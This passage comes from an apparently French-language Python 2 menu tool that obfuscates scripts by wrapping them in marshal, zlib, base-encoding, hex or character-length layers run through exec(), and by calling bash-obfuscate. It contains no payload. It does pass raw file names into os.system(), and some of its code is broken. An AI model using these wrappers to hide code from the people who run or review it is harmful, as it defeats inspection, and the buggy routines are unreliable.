     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;116m Menu general          \033[1;97m   ║") 
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
     choix_bash()
def choix_bash():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_bash()
    elif dmd =="1" or dmd =="c" or dmd =="C":
        cryptage_bash()
    elif dmd =="p" or dmd =="P":
        menu_bash_ou_wordliste()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_bash()
####################################################################################################	
def cryptage_bash(): 
   try:
       cls()
       print(logo8)
       bash_cryp_script = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
       resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
       os.system("bash-obfuscate " + bash_cryp_script + " -o " + resultat )
       print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;92m Terminer..")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_bash()
   except KeyboardInterrupt:
       print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Arret!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_bash()
   except IOError:
       print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Fichier introuvable!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_bash()
####################################################################################################	
####################################################################################################
def menu_zlib_mars():
     cls()
     print(logo7)
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;111m Marshall  + Base64    \033[1;97m   ║")  
     print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Marshall  + Base32    \033[1;97m   ║")  
     print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;113m Marshall  + Base16    \033[1;97m   ║")  
     print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;136m Menu Zlib + Base      \033[1;97m   ║")      
     print("\033[1;97m║ \033[1;91m[\033[1;96m5.\033[1;91m]\033[38;5;241m Marshall  + Zlib + Base\033[1;97m  ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu General          \033[1;97m   ║") 
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
     choix_zlib_mars()
def choix_zlib_mars():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_zlib_mars()
    elif dmd =="1":
        mars_base64()
    elif dmd =="2":
        mars_base32()
    elif dmd =="3":
        mars_base16()
    elif dmd =="4":
        menu_zlib_plus_base()
    elif dmd =="5":
        menu_mars_zlib_base() 
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_zlib_mars()
####################################################################################################
def mars_base64():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		mars_zlib_base()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b64encode(mc.dumps(compile(ouverture, '<string>', 'exec')))
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , base64\nexec(marshal.loads(base64.b64decode('''"+compresse+"''')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                mars_zlib_base()		
####################################################################################################
def mars_base32():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_mars()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b32encode(mc.dumps(compile(ouverture, '<string>', 'exec')))
		enregistrement = open(emplacement,'w')
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , base64\nexec(marshal.loads(base64.b32decode('"+compresse+"')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_mars()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_mars()
####################################################################################################		
def mars_base16():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_mars()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b16encode(mc.dumps(compile(ouverture, '<string>', 'exec')))
		enregistrement = open(emplacement,'w')
		enregistrement.write('#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , base64\nexec(marshal.loads(base64.b16decode("'+compresse+'")))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_mars()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_mars()   
####################################################################################################
####################################################################################################
def menu_zlib_plus_base():
     cls()
     print(logo7)
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;111m Zlib + Base64         \033[1;97m   ║")  
     print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Zlib + Base32         \033[1;97m   ║")  
     print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;113m Zlib + Base16         \033[1;97m   ║") 
     print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;136m Zlib   Uniquement     \033[1;97m   ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;114m Menu   Precedent      \033[1;97m   ║") 
     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu   General        \033[1;97m   ║") 
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
     choix_zlib_plus_base()
def choix_zlib_plus_base():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_zlib_plus_base()
    elif dmd =="1":
        zlib_base_64()
    elif dmd =="2":
        zlib_base_32()
    elif dmd =="3":
        zlib_base_16() 
    elif dmd =="4":
        zlib_compresse()
    elif dmd =="p" or dmd =="P":
        menu_zlib_mars()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_zlib_plus_base()
####################################################################################################
def zlib_base_64():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b64encode(zlib.compress(lecture))
		enregistrement = open(resultat,'w')
                enregistrement.write("'#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib , marshal , base64\nfrom base64 import *\nexec(zlib.decompress(base64.b64decode('''"+ repr(compresse) +"''')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################
def zlib_base_32():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b32encode(zlib.compress(lecture))
		enregistrement = open(resultat,'w')
                enregistrement.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib , marshal , base64\nfrom base64 import *\nexec(zlib.decompress(base64.b32decode('" + repr(compresse) + "')))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################v		
def zlib_base_16():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = base64.b16encode(zlib.compress(lecture))
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib , marshal , base64\nfrom base64 import *\nexec(zlib.decompress(base64.b16decode(' + repr(compresse) + ')))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################			
def zlib_compresse():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_zlib_plus_base()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compresse = zlib.compress(lecture)
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib\nexec(zlib.decompress(' + repr(compresse) + '))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_zlib_plus_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_zlib_plus_base()
####################################################################################################
####################################################################################################
def menu_mars_zlib_base():
    cls()
    print(logo7)
    print("\033[1;97m╔"+30*"═"+1*"═╗")
    print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;111m Marshal Uniquement      \033[1;97m ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Marshal + Zlib + Base64 \033[1;97m ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;136m Marshal + Zlib + Base32 \033[1;97m ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;241m Marshal + Zlib + Base16 \033[1;97m ║") 
    print("\033[1;97m║ \033[1;91m[\033[1;96m5.\033[1;91m]\033[1;92m Mise a jour du script \033[1;97m   ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;243m Menu  Precedent       \033[1;97m   ║")
    print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu   general       \033[1;97m    ║")
    print("\033[1;97m╚"+30*"═"+1*"═╝")   
    print("\033[1;97m║")
    choix_mars_zlib_base() 
def choix_mars_zlib_base():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_mars_zlib_base()
    elif dmd =="1":
        marshall()
    elif dmd =="2":
        mars_zlib_base_64()
    elif dmd =="3":
        mars_zlib_base_32()
    elif dmd =="4":
        mars_zlib_base_16()
    elif dmd =="5":
        Maj()
    elif dmd =="p" or dmd =="P":
        menu_zlib_plus_base()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
	raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_mars_zlib_base()
####################################################################################################
def marshall():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		ouverture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_base()
	print("\033[1;97m║")
	emplacement = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		depot = ouverture.replace('\r\n', '\n')
	        depot = depot.replace('\r', 'n')
	        if depot and depot[(-1)] != '\n':
	            depot = depot + '\n'
	        compilage = pp.compile(depot, '<r>', 'exec')
	        vidage = marshal.dumps(compilage)
		enregistrement = open(emplacement,"w")
		enregistrement.write("#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal\nexec(marshal.loads("+repr(vidage)+"))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base() 
####################################################################################################		
def mars_zlib_base_64():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_basemenu_mars_zlib_base()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = mc.dumps(compile(lecture, '<string>', 'exec'))
		compresse = base64.b64encode(zlib.compress(compression))
		enregistrement = open(resultat,'w')
                enregistrement.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b64decode('''"+ repr(compresse) +"'''))))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base()
####################################################################################################
def mars_zlib_base_32():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_base()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = mc.dumps(compile(lecture, '<string>', 'exec'))
		compresse = base64.b32encode(zlib.compress(compression))
		enregistrement = open(resultat,'w')
                enregistrement.write("#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b32decode('" + repr(compresse) + "'))))")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base()
####################################################################################################
def mars_zlib_base_16():
	cls()  
        charge()
        cls()
        print(logo7)
	script_mars = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
	try:
		lecture = open(script_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_mars_zlib_base()
	print("\033[1;97m║")
	resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		compression = mc.dumps(compile(lecture, '<string>', 'exec'))
		compresse = base64.b16encode(zlib.compress(compression))
		enregistrement = open(resultat,'w')
                enregistrement.write('#Compiler par Faxel\n#Twitter https://twitter.com/Faxel2020\nimport zlib, base64,marshal\nexec(marshal.loads(zlib.decompress(base64.b16decode(' + repr(compresse) + '))))')
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_mars_zlib_base()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Compilage echouer")
		raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_mars_zlib_base()
####################################################################################################
def Maj():
    cls()	     
    h = raw_input("\033[1;91m[\033[1;93m?\033[1;91m] \033[1;97mVoulez-vous effectuer une mise a jour du script ? \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;97m ")
    if h =="n" or h =="N":
         menu_mars_zlib_base()
    elif h =="o" or h =="O":
	 cls()
	 load("\033[1;97mChargement\033[1;93m...")
	 cls()
         os.system('git pull origin master')
	 raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
	 os.system("cd $HOME/compiler && python2 es ")
    else:
         print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + h + ' \x1b[1;91mindisponible')
         raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu')
         menu_mars_zlib_base()
####################################################################################################
####################################################################################################
def Menu_Hex():
     cls()
     print(logo6)
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;241m Cryptage Hex          \033[1;97m   ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Cryptage Hex + Join   \033[1;97m   ║") 
     print("\033[1;97m║ \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;115m Menu Precedent        \033[1;97m   ║") 
     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu General          \033[1;97m   ║")
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
     choix_hex()
def choix_hex():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	Menu_Hex()
    elif dmd =="1":
        Cryptage_Hex()
    elif dmd =="2":
        Cryptage_Hex_Join() 
    elif dmd =="p" or dmd =="P":
        menu_Faxel_cryptage()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        Menu_Hex()
####################################################################################################
def Cryptage_Hex():
   cls()  
   charge()
   cls()
   print(logo6)
   script_Hex = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
   print("\033[1;97m║")
   resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m") 
   ouverture = open(script_Hex).read()
   verife_hex = binascii.hexlify(ouverture)
   compression = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n\nexec("{}").decode("hex")'.format(verife_hex)
   enregistrement = open(resultat, 'w')
   enregistrement.write(compression)
   enregistrement.close()
   print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
   raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   Menu_Hex() 
####################################################################################################	
def Cryptage_Hex_Join():
   cls()  
   charge()
   cls()
   print(logo6)  
   script_Hex_join = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Entrer le nom du script a crypter \033[1;91m▶▶▶ \033[1;97m")
   print("\033[1;97m║")
   resultat = raw_input("\033[1;97m╚═\033[1;31m▶\033[1;97m Nommer le resultat du cryptage \033[1;91m▶▶▶ \033[1;97m") 
   ouverture_1 = open(script_Hex_join).read()
   verife_hex = binascii.hexlify(ouverture_1)
   compression_premiere = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n\nexec("{}").decode("hex")'.format(verife_hex)
   enregistrement_premier = open(resultat, 'w')
   enregistrement_premier.write(compression_premiere)
   enregistrement_premier.close()
   mael = []
   faxel = []
   ouverture_2 = open(resultat).read()
   for l in ouverture_2:
       mael.append(ord(l))
   for b in mael:
       faxel.append('f' * b)
   compression_final = '#Compiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal , binascii, base64 , sys\n\nd={}\nexec("".join([chr(len(i)) for i in d]))'.format(faxel)
   enregistrement_final = open(resultat, 'w')
   enregistrement_final.write(compression_final)
   enregistrement_final.close()
   py_compile.compile(resultat)
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
   raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   Menu_Hex() 
#################################################################################################### 
####################################################################################################
def menu_Faxel_cryptage():
     cls()
     print(logo6)
     print("\033[1;97m╔"+30*"═"+1*"═╗")
     print("\033[1;97m║ \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;241m Cryptage Join         \033[1;97m   ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;125m Cryptage Bin Base Join\033[1;97m   ║") 
     print("\033[1;97m║ \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;136m Menu encodage HEX     \033[1;97m   ║")
     print("\033[1;97m║ \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;112m Menu general          \033[1;97m   ║") 
     print("\033[1;97m╚"+30*"═"+1*"═╝")   
     print("\033[1;97m║")
     choix_Faxel_cryptage()
def choix_Faxel_cryptage():    
    dmd = raw_input("\033[1;97m╚═\033[1;31m▶\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m▶▶▶ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_Faxel_cryptage()
    elif dmd =="1":
        Cryptage_join()
    elif dmd =="2":
        Cryptage_Bin_Base_Join() 
    elif dmd =="3":
        Menu_Hex() 
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
